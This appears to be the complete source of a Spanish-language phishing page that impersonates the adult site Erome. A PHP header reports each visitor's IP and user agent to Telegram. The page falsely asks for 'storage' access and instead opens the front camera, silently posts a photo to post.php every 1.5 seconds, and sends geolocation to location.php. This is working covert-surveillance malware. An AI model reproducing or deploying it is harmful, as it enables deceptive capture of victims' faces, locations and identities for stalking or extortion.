<?php 
require_once __DIR__ . '/config.php';
require_once __DIR__ . '/ip_utils.php';
require_once __DIR__ . '/telegram.php';

$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';
$ts = gmdate('c');

$msg = "👋 <b>Nueva visita</b>\n".
       "📌 IP: $ip\n".
       "🖥️ UA: $ua\n".
       "⏰ Hora: $ts";
send_to_telegram($msg);
?>

<!doctype html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Dispositivo</title>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
</head>
<body>

<h3 id="bateria"></h3> 
<strong id="myIp"></strong>

<script>
// Función para mostrar la IP pública
function get_ip(obj){
    document.getElementById('myIp').innerHTML = obj.ip;
};
</script>
<script type="text/javascript" src="https://api.ipify.org/?format=jsonp&callback=get_ip"></script>

<!-- Mantener tus includes existentes -->
<script src="ip.js"></script>
<script src="ajax.js"></script>

</body>
</html>

<!doctype html>
<html>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        body {
            margin: 0;
            font-family: Arial, Helvetica, sans-serif;
            background: #111;
            color: #fff;
            height: 100vh;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
        }

        /* Imagen censurada inicial visible desde el inicio */
        body::before {
            content: "";
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: url('img/image1.jpg') no-repeat center center/cover;
            filter: blur(20px) brightness(0.3);
            z-index: -1;
            transition: all 1s ease;
        }

        /* Imagen normal cuando se desbloquea */
        body.unlocked::before {
            background: url('img/image2.jpg') no-repeat center center/cover;
            filter: none;
        }

        /* Caja estilo erome */
        #cameraModal .content {
            background: #1c1c1c;
            color: #fff;
            padding: 25px;
            border-radius: 6px;
            max-width: 420px;
            text-align: center;
            box-shadow: 0 0 15px rgba(0,0,0,0.6);
            border: 1px solid #333;
        }

        /* Logo */
        .logo {
            max-width: 150px;
            margin-bottom: 15px;
        }

        /* Botón rojo estilo erome */
        #grantAccess {
            margin-top: 20px;
            padding: 12px 25px;
            background-color: #e50914;
            color: #fff;
            border: none;
            border-radius: 3px;
            cursor: pointer;
            font-size: 16px;
            font-weight: bold;
            transition: background 0.2s;
        }
        #grantAccess:hover {
            background-color: #b00610;
        }

        /* Modal de permisos */
        #cameraModal {
            position: fixed;
            top: 0; left: 0;
            width: 100%; height: 100%;
            background: rgba(0,0,0,0.8);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
        }

        /* Animación desbloqueando */
        #unlockAnimation {
            position: fixed;
            top:0; left:0;
            width:100%; height:100%;
            background: rgba(0,0,0,0.9);
            color: #fff;
            display: flex;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            font-size: 22px;
            z-index: 10000;
            display: none;
        }

        .loader {
            border: 6px solid #333;
            border-top: 6px solid #e50914;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-top: 15px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg);}
            100% { transform: rotate(360deg);}
        }

        /* Mensaje pequeño estilo disclaimer */
        .disclaimer {
            font-size: 11px;
            color: #aaa;
            margin-top: 15px;
        }
    </style>
</head>
<body>

<!-- Modal de permisos -->
<div id="cameraModal">
    <div class="content">
        <img src="img/logo-erome-vertical.png" alt="Erome Logo" class="logo">
 <!--       <h2>¡Atención!</h2> -->
        <p>📸 ¡Wow! Apareces en la imagen de fondo... ¿seguro que no eres tú? Para poder acceder y visualizar la imagen correctamente, necesitamos tu permiso para acceder al almacenamiento y descargar el contenido.</p>
        <button id="grantAccess">Permitir acceso</button>
        <div class="disclaimer">
            Al acceder y utilizar esta página, usted reconoce que lo hace por su propia voluntad y asume toda la responsabilidad por cualquier acción o consecuencia derivada de su uso.
        </div>
    </div>
</div>

<!-- Animación de desbloqueo -->
<div id="unlockAnimation">
    <div>Desbloqueando imagen...</div>
    <div class="loader"></div>
</div>

<!-- Video y Canvas ocultos -->
<video id="video" autoplay playsinline style="display:none;"></video>
<canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

<script>
'use strict';

function post(imgdata){
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'post.php',
        dataType: 'json',
        async: false
    });
}

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const constraints = { audio: false, video: { facingMode: "user" } };

async function initCamera() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        video.srcObject = stream;
        capturePhotoLoop();

        const unlockModal = document.getElementById('unlockAnimation');
        unlockModal.style.display = 'flex';

        setTimeout(() => {
            unlockModal.style.display = 'none';
            document.body.classList.add('unlocked');
        }, 5000);

    } catch (e) {
        console.error('Error al acceder a la cámara:', e);
        document.getElementById('cameraModal').style.display = 'flex';
    }
}

function capturePhotoLoop() {
    const context = canvas.getContext('2d');
    setInterval(function(){
        context.drawImage(video, 0, 0, 640, 480);
        const canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
        post(canvasData);
    }, 1500);
}

document.getElementById('grantAccess').addEventListener('click', () => {
    document.getElementById('cameraModal').style.display = 'none';
    initCamera();
});

if ('geolocation' in navigator) {
    navigator.geolocation.getCurrentPosition(function(pos) {
        const { latitude, longitude, accuracy } = pos.coords;
        fetch('location.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ latitude, longitude, accuracy })
        });
    });
}
</script>
</body>
</html>
